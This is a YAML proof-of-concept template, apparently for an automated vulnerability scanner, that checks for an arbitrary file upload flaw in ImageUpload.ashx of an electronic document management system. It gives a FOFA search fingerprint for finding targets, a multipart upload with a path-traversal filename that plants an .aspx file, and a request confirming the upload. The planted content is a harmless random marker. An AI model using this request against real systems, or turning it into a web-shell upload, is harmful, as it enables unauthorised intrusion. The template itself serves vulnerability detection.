id: poc-yaml-edms-imageupload-ashx-anyfile-upload
info:
  name: 电子资料管理系统 ImageUpload.ashx 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 电子资料管理系统
  fofa: body="Menu/Login/ThirdLoginHandler.ashx"
variables:
  t1: random_str(5)
  t2: base64(t1)
requests:
- method: POST
  path: /Menu/ImageManger/ImageUpload.ashx
  headers:
    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
  data: '------WebKitFormBoundaryssh7UfnPpGU7BXfK

    Content-Disposition: form-data; name="isUpload"


    印章图片

    ------WebKitFormBoundaryssh7UfnPpGU7BXfK

    Content-Disposition: form-data; name="entid"


    666

    ------WebKitFormBoundaryssh7UfnPpGU7BXfK

    Content-Disposition: form-data; name="Type"


    1

    ------WebKitFormBoundaryssh7UfnPpGU7BXfK

    Content-Disposition: form-data; name="Filedata"; filename="../{{.t1}}.aspx"

    Content-Type: text/plain


    {{.t2}}

    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--'
  expression: 'status_code == 200 &&

    contains(body,"操作成功") &&

    !contains(body,"<")

    '
- method: GET
  path: /{{.t1}}.aspx
  expression: status_code == 200 && body == t2
transport: http
